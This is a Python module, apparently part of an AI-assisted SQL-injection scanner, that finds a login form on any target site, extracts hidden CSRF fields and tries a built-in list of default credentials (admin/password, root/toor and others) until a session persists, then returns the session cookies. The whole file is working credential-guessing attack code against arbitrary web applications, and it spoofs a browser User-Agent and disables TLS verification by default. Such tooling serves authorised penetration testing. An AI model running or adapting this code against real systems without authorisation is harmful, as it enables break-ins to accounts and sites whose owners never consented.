"""Generic, organic form-login authentication.

Establishes an authenticated session on ANY target that gates its content behind
a login form — with no per-app knowledge. The technique is a generic scanner
capability, not an answer key:

  1. locate a login form (the landing page, or a few conventional login paths);
  2. parse it: the password field, the companion username field, the form action,
     and every hidden field (CSRF/anti-forgery tokens, difficulty selectors);
  3. try a small list of well-known DEFAULT credentials (admin/password, ...);
  4. for each attempt, GET the form fresh (new CSRF token + cookies), POST the
     credentials plus the hidden fields, and check whether the session became
     authenticated (no longer a login page / redirected / new session cookie);
  5. return the resulting session cookies.

This mirrors what a pentester does by hand and what Burp's session handling
does with a login macro — applied automatically to whatever form is discovered.
"""

from __future__ import annotations

import re
from urllib.parse import urljoin, urlparse

import httpx

from sqli_ai.param_discovery import hidden_form_fields

# Conventional login locations to probe when the landing page has no form. These
# are generic web conventions (not app-specific endpoints) — the same list works
# for any PHP/Java/Rails/Node app.
_LOGIN_PATHS = (
    "/login", "/login.php", "/signin", "/sign-in", "/users/login",
    "/user/login", "/account/login", "/auth/login", "/admin/login",
    "/portal.php", "/index.php?page=login", "/wp-login.php",
)

# Generic default credential pairs seen across training apps and shipped
# defaults. Ordered by prevalence. Not tied to any one target.
_DEFAULT_CREDS = (
    ("admin", "password"), ("admin", "admin"), ("admin", "admin123"),
    ("administrator", "password"), ("admin", "password123"),
    ("root", "root"), ("root", "toor"), ("user", "user"),
    ("test", "test"), ("guest", "guest"), ("bee", "bug"),
    ("admin", "changeme"), ("demo", "demo"),
)

_PW_INPUT = re.compile(r"<input[^>]*type=['\"]?password['\"]?[^>]*>", re.IGNORECASE)
_FORM_TAG = re.compile(r"<form\b[^>]*>", re.IGNORECASE)
_ATTR = lambda tag, name: (  # noqa: E731
    m.group(1) if (m := re.search(
        rf"""{name}=['"]([^'"]*)['"]""", tag, re.IGNORECASE)) else None
)

# Field-name hints for the username companion to the password field.
_USER_HINTS = (
    "user", "username", "uname", "email", "login", "userid", "user_id",
    "account", "loginname", "j_username",
)
# Response substrings that mean the login FAILED (still on the login page).
_FAIL_HINTS = (
    "invalid", "incorrect", "failed", "wrong", "denied", "try again",
    "authentication failed", "login failed", "bad credentials",
    "does not exist", "not found",
)


def _name_of(tag: str) -> str | None:
    return _ATTR(tag, "name") or _ATTR(tag, "id")


def _find_login_form(html: str):
    """Return (action, method, username_field, password_field) or None.

    Parses the first ``<form>`` that contains a password input. Picks the
    username field as the text/email input whose name best matches a login hint,
    else the first non-password text input in the form.
    """
    if not _PW_INPUT.search(html):
        return None
    # Split into forms; find the one containing a password input.
    forms = re.split(r"(?i)</form>", html)
    for frag in forms:
        if not _PW_INPUT.search(frag):
            continue
        ftag_m = _FORM_TAG.search(frag)
        ftag = ftag_m.group(0) if ftag_m else "<form>"
        action = _ATTR(ftag, "action") or ""
        method = (_ATTR(ftag, "method") or "post").lower()
        inputs = re.findall(r"<input\b[^>]*>", frag, re.IGNORECASE)
        pw_field = None
        text_fields: list[str] = []
        for inp in inputs:
            itype = (_ATTR(inp, "type") or "text").lower()
            name = _name_of(inp)
            if not name:
                continue
            if itype == "password" and pw_field is None:
                pw_field = name
            elif itype in ("text", "email", "tel", ""):
                text_fields.append(name)
        if not pw_field:
            continue
        user_field = None
        for hint in _USER_HINTS:
            for tf in text_fields:
                if hint in tf.lower():
                    user_field = tf
                    break
            if user_field:
                break
        if not user_field and text_fields:
            user_field = text_fields[0]
        if not user_field:
            user_field = "username"
        return action, method, user_field, pw_field
    return None


def _looks_authenticated(resp: httpx.Response, login_url: str) -> bool:
    """Heuristic: did we leave the login page for an authenticated session?"""
    body = resp.text or ""
    low = body.lower()
    if any(h in low for h in _FAIL_HINTS):
        return False
    # Still showing a password field → still the login form → not authenticated.
    if _PW_INPUT.search(body):
        return False
    # Landed somewhere other than the login page, with a 2xx/3xx — good sign.
    final_path = urlparse(str(resp.url)).path
    login_path = urlparse(login_url).path
    if 200 <= resp.status_code < 400 and final_path != login_path:
        return True
    # Same path but no password field and no failure text → likely a logged-in
    # dashboard rendered at the same URL.
    return 200 <= resp.status_code < 300


def establish_session(
    site: str,
    console=None,
    timeout: float = 12.0,
    verify_ssl: bool = False,
    headers: dict[str, str] | None = None,
) -> tuple[dict[str, str], str]:
    """Try to log in to ``site`` with default creds; return (cookies, message).

    ``cookies`` is empty when no login form is found or every credential failed.
    Fully organic: it only ever interacts with a form the app itself serves.
    """
    def log(msg: str) -> None:
        if console is not None:
            console.print(msg)

    hdrs = dict(headers or {})
    hdrs.setdefault(
        "User-Agent",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120 Safari/537.36",
    )
    kwargs = {"timeout": timeout, "verify": verify_ssl, "follow_redirects": True}

    # 1. Locate a login form: landing page first, then conventional paths.
    login_url = None
    form = None
    with httpx.Client(**kwargs) as c:
        candidates = [site.rstrip("/") + "/"]
        candidates += [urljoin(site, p) for p in _LOGIN_PATHS]
        seen: set[str] = set()
        for url in candidates:
            if url in seen:
                continue
            seen.add(url)
            try:
                r = c.get(url, headers=hdrs)
            except (httpx.HTTPError, OSError):
                continue
            f = _find_login_form(r.text)
            if f:
                # Resolve the form action against the URL we actually landed on.
                action, method, uf, pf = f
                login_url = urljoin(str(r.url), action) if action else str(r.url)
                form = (login_url, method, uf, pf)
                break

        if not form:
            return {}, "no login form found (landing page + common login paths)"

        login_url, method, user_field, pw_field = form
        log(f"[dim]Auth: login form at {login_url} "
            f"(user='{user_field}', pass='{pw_field}')[/dim]")

        # 2. Try default credentials.
        for user, pw in _DEFAULT_CREDS:
            # Fresh GET → new CSRF token + session cookie for this attempt.
            try:
                page = c.get(login_url, headers=hdrs)
            except (httpx.HTTPError, OSError):
                continue
            fields = hidden_form_fields(page.text)  # CSRF/anti-forgery + hidden state
            fields[user_field] = user
            fields[pw_field] = pw
            # Common submit-button names some apps require to branch server-side.
            fields.setdefault("Login", "Login")
            fields.setdefault("form", "submit")
            try:
                if method == "get":
                    resp = c.get(login_url, params=fields, headers=hdrs)
                else:
                    resp = c.post(login_url, data=fields, headers=hdrs)
            except (httpx.HTTPError, OSError):
                continue
            if not _looks_authenticated(resp, login_url):
                continue
            # Verify the session actually persists: re-request the login page
            # with the captured cookies. If we're bounced back to a login form,
            # the "success" was illusory (stale CSRF / session regeneration /
            # session fixation) — keep trying other credentials rather than
            # returning a dead session that finds nothing.
            try:
                check = c.get(login_url, headers=hdrs)
            except (httpx.HTTPError, OSError):
                check = resp
            if _PW_INPUT.search(check.text or "") and \
                    urlparse(str(check.url)).path == urlparse(login_url).path:
                continue  # still shown a login form → not really authenticated
            jar = {k: v for k, v in c.cookies.items()}
            if jar:
                log(f"[green]✓ Auth: logged in as {user}/{pw}[/green] "
                    f"[dim]({len(jar)} session cookie(s), verified)[/dim]")
                return jar, f"authenticated as {user}/{pw}"
        return {}, "login form found but all default credentials failed/didn't persist"
